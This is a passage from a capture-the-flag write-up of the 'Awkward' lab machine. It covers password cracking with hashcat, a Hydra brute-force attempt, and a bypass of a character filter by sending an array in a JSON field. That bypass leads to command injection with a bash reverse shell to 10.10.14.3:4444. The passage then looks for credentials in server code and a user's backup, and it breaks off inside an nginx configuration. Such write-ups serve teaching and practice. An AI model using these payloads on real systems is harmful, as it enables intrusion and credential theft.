<span class="k">*</span> Not-Salted
<span class="k">*</span> Not-Iterated
<span class="k">*</span> Single-Salt
<span class="k">*</span> Raw-Hash

ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append <span class="nt">-O</span> to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c

Host memory required <span class="k">for </span>this attack: 1 MB

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/seclists/rockyou.txt
<span class="k">*</span> Passwords.: 14344384
<span class="k">*</span> Bytes.....: 139921497
<span class="k">*</span> Keyspace..: 14344384

e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 <span class="o">(</span>SHA2-256<span class="o">)</span>
Hash.Target......: hash.txt
Time.Started.....: Fri Jan 13 17:55:39 2023 <span class="o">(</span>4 secs<span class="o">)</span>
Time.Estimated...: Fri Jan 13 17:55:43 2023 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/seclists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:  4072.8 kH/s <span class="o">(</span>0.35ms<span class="o">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/4 <span class="o">(</span>25.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/4 <span class="o">(</span>25.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 14344384/14344384 <span class="o">(</span>100.00%<span class="o">)</span>
Rejected.........: 0/14344384 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 14344384/14344384 <span class="o">(</span>100.00%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: <span class="nv">$HEX</span><span class="o">[</span>21217365786d652121] -&gt; <span class="nv">$HEX</span><span class="o">[</span>042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 50%

Started: Fri Jan 13 17:55:25 2023
Stopped: Fri Jan 13 17:55:45 2023
</pre></td></tr></tbody></table></code></div></div>

<p>I had the password for ‚Äòchristopher.jones‚Äô. I tried the credentials in SSH, but they failed. I tried them on the sites. It worked on the main site but failed in the store.</p>

<p>I had some potential usernames. So I launched Hydra to try to brute force the store login. It went through all rockyou without any success.</p>

<h2 id="remote-code-execution"><span class="mr-2">Remote Code Execution</span><a href="#remote-code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once connected to the site, I tried the different API calls again. The status call worked the same way. I kept in mind that I still needed to use it to scan ports. But I kept exploring the other calls first.</p>

<p>The call to get the leave requests were now returning two rows.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
</pre></td></tr></tbody></table></code></div></div>

<p>The call to submit new leave requests was sending the three fields in JSON. I tried using it to execute code on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, <span class="k">*</span>/<span class="k">*</span>
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: application/json
Content-Length: 67
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/leave
Cookie: <span class="nv">token</span><span class="o">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNjUwNzgzfQ.BmsL4d_9cvKe3dJKhW5XVio841FaYrvkfuO3iYlZKbs

<span class="o">{</span><span class="s2">"reason"</span>:<span class="s2">"</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span><span class="s2"> </span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">; id"</span>,<span class="s2">"start"</span>:<span class="s2">"13/01/2023"</span>,<span class="s2">"end"</span>:<span class="s2">"13/01/2023"</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>But some characters were rejected.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 13 Jan 2023 23:02:10 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 23
Connection: close
x-powered-by: Express
access-control-allow-origin: <span class="k">*</span>
etag: W/<span class="s2">"17-OzWJr/zG6kKdbqASHxkKlgUotLk"</span>

Bad character detected.
</pre></td></tr></tbody></table></code></div></div>

<p>I did some experimentation and found that those characters were rejected:  ! # $ ? &amp; * ( ) &lt; &gt; [ ] { } ; ` | .</p>

<p>But those were not:</p>

<p><img data-src="/assets/images/Awkward/ValidChars.png" alt="Valid Characters" title="Valid Characters" data-proofer-ignore></p>

<p>Sending a comma in my payload was very interesting.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"reason"</span><span class="p">:</span><span class="s2">"re,ason"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"end"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/images/Awkward/CommaInPayload.png" alt="Comma In Payload" title="Comma In Payload" data-proofer-ignore></p>

<p>It looked like the comma was used as a separator. With the name of the box hinting at the use of <code class="language-plaintext highlighter-rouge">awk</code>, I pushed more in that direction. There was a <a href="https://bugs.busybox.net/show_bug.cgi?id=14781">vulnerability in awk</a> released a few months before the box. But I could not exploit it.</p>

<p>I kept experimenting with the payload. And when I tried sending an object as the reason instead of a string, it got interesting.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"reason"</span><span class="p">:{},</span><span class="w">
  </span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"end"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>The response contained an error.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">TypeError</span><span class="p">:</span> <span class="nx">reason</span><span class="p">.</span><span class="nx">includes</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">a</span> <span class="kd">function</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">server</span><span class="o">/</span><span class="nx">server</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">47</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nb">Array</span><span class="p">.</span><span class="nf">some </span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">anonymous</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">server</span><span class="o">/</span><span class="nx">server</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">27</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="k">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">layer</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nf">next </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">route</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">144</span><span class="p">:</span><span class="mi">13</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Route</span><span class="p">.</span><span class="nf">dispatch </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">route</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">114</span><span class="p">:</span><span class="mi">3</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="k">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">layer</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">284</span><span class="p">:</span><span class="mi">15</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nb">Function</span><span class="p">.</span><span class="nf">process_params </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">346</span><span class="p">:</span><span class="mi">12</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nf">next </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">280</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The code was calling <code class="language-plaintext highlighter-rouge">includes</code> on the passed in reason. It was probably trying to look for the forbidden characters. I tried with an array.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"reason"</span><span class="p">:[],</span><span class="w">
  </span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"end"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>This worked. And even better, the array allowed me to bypass the validation.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"reason"</span><span class="p">:[</span><span class="w">
    </span><span class="s2">"reason$"</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"end"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I tried using this to execute code and get a reverse shell.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"reason"</span><span class="p">:[</span><span class="w">
    </span><span class="s2">"`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1'`"</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"end"</span><span class="p">:</span><span class="s2">"13/01/2023"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I got a hit on my netcat listener. And I was on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.185] 51432
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1969<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell

www-data@awkward:~/hat-valley.htb<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
</pre></td></tr></tbody></table></code></div></div>

<h2 id="lateral-movement"><span class="mr-2">Lateral Movement</span><a href="#lateral-movement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I looked around the server. I could not run <code class="language-plaintext highlighter-rouge">sudo</code> as www-data and I did not find any <code class="language-plaintext highlighter-rouge">suid</code> binary.</p>

<p>The server.js code of the main application contained some credentials.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nf">createConnection</span><span class="p">({</span>
  <span class="na">host</span><span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">user</span><span class="p">:</span> <span class="dl">'</span><span class="s1">root</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">password</span><span class="p">:</span> <span class="dl">'</span><span class="s1">REDACTED</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">database</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hatvalley</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">stringifyObjects</span><span class="p">:</span> <span class="kc">true</span>
<span class="p">})</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3002</span>

<span class="kd">const</span> <span class="nx">TOKEN_SECRET</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">REDACTED</span><span class="dl">"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I connected to the database, but it only contained the username and password I already got through the API.</p>

<p>The file <code class="language-plaintext highlighter-rouge">/var/www/private/leave_requests.csv</code> contained the leave requests from everyone.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>www-data@awkward:~/hat-valley.htb<span class="nv">$ </span><span class="nb">cat</span> ../private/leave_requests.csv
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday <span class="k">in </span>Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a <span class="nb">break </span>from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle<span class="s1">'s goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
christopher.jones,,13/01/2023,14/01/2023,Pending
</span></pre></td></tr></tbody></table></code></div></div>

<p>There were two home folders. One for christine that I could not read. And one for bean that had some readable files and folders.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>www-data@awkward:~/store<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bean/
total 84
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 <span class="nb">.</span>
drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..
lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span>  1 bean bean  220 Sep 15 21:34 .bash_logout
<span class="nt">-rw-r--r--</span>  1 bean bean 3847 Sep 15 21:45 .bashrc
drwx------  9 bean bean 4096 Sep 22 14:30 .cache
drwx------ 13 bean bean 4096 Oct  6 01:35 .config
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktop
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documents
drwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloads
drwx------  2 bean bean 4096 Sep 22 14:24 .gnupg
drwx------  3 bean bean 4096 Sep 15 21:35 .local
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Music
drwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npm
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures
<span class="nt">-rw-r--r--</span>  1 bean bean  807 Sep 15 21:34 .profile
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Public
drwx------  4 bean bean 4096 Sep 15 21:55 snap
drwx------  2 bean bean 4096 Sep 15 21:36 .ssh
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates
<span class="nt">-rw-r-----</span>  1 root bean   33 Jan 14 23:22 user.txt
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videos

www-data@awkward:~/store<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bean/Desktop/
total 8
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 <span class="nb">.</span>
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..

www-data@awkward:~/store<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bean/Documents/
total 16
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 <span class="nb">.</span>
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..
drwxrwxr-x  2 bean bean 4096 Sep 15 21:46 backup
<span class="nt">-rwxrwxr-x</span>  1 bean bean  369 Sep 15 21:45 backup_home.sh

www-data@awkward:~/store<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bean/Documents/backup/
total 40
drwxrwxr-x 2 bean bean  4096 Sep 15 21:46 <span class="nb">.</span>
drwxr-xr-x 3 bean bean  4096 Sep 15 21:46 ..
<span class="nt">-rw-rw-r--</span> 1 bean bean 31715 Sep 15 21:46 bean_backup_final.tar.gz
</pre></td></tr></tbody></table></code></div></div>

<p>The backup file was interesting. There were some files and folders I could not read. By extracting it, I thought I might be able to read bean‚Äôs SSH keys.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>www-data@awkward:~<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/test/

www-data@awkward:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/test/

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">cp</span> /home/bean/Documents/backup/bean_backup_final.tar.gz <span class="nb">.</span>

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">gunzip </span>bean_backup_final.tar.gz

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">ls
</span>bean_backup_final.tar

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> bean_backup_final.tar

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">ls
</span>bean_backup_final.tar  bean_backup.tar.gz  time.txt

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">cat </span>time.txt
Thu 15 Sep 2022 21:46:25 AEST

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">gunzip </span>bean_backup.tar.gz

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> bean_backup.tar

www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">ls
</span>bean_backup_final.tar  bean_backup.tar  Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  time.txt  Videos

ww-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> .ssh/
total 8
drwx------  2 www-data www-data 4096 Sep 15 21:36 <span class="nb">.</span>
drwxr-x--- 15 www-data www-data 4096 Sep 15 21:45 ..

</pre></td></tr></tbody></table></code></div></div>

<p>Sadly, there were no SSH keys in the backup. I looked at what it contained. I found the <code class="language-plaintext highlighter-rouge">keyrings</code> file in <code class="language-plaintext highlighter-rouge">.local/share/keyrings/</code>. I used John to crack it, the password was not in rockyou.</p>

<p>I looked around the backup but did not find anything else at first. So I went back to looking in the server. The store site requires basic authentication. And that was not in the code. So I looked at the configuration of nginx.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
